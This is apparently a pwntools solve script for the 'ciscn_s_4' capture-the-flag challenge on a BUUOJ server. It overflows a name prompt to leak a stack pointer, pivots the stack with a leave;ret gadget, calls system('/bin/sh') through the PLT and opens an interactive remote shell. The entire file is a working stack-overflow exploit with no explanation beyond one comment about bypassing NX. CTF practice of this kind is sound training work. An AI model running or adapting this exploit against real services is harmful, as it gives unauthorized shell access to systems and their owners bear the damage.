from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 28762)

elf = ELF('../ciscn_s_4')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.27-i386/libc-2.27.so')

system_plt = elf.plt['system']

target.sendlineafter('name?', b'a' * 0x28)
ebp = u32(target.recvuntil(b'\xff')[-4:])
print(hex(ebp))

buf = ebp - 0x38
# By pass NX because system_plt's address is executable :)
payload = (p32(system_plt) + p32(0x0) + p32(buf + 12) +
           b'/bin/sh\x00').ljust(0x28, b'a') + p32(buf - 4) + p32(0x08048562)
target.send(payload)
target.interactive()